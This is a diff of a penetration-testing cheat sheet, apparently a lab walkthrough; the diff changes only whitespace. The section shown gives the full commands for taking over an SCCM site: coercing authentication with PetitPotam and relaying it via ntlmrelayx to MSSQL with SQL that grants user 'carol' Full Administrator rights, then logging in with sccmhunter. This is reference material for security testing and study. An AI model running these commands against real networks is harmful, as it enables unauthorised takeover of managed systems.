@@ -281,22 +281,26 @@ SQL> select name from sysdatabases where name like 'CM_%'
 
 **Exploitation**:
 
-* Generate the query to elevate our user: 
+* Generate the query to elevate our user:
+
     ```ps1
     python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked
     ```
 
-* Setup a relay with the generated query: 
+* Setup a relay with the generated query:
+
     ```ps1
     ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"
     ```
 
-* Coerce an authentication to your listener using a domain account: 
+* Coerce an authentication to your listener using a domain account:
+
     ```ps1
     petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
     ```
 
-* Finally, connect as admin on the MSSQL server: 
+* Finally, connect as admin on the MSSQL server:
+
     ```ps1
     python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11
     ```
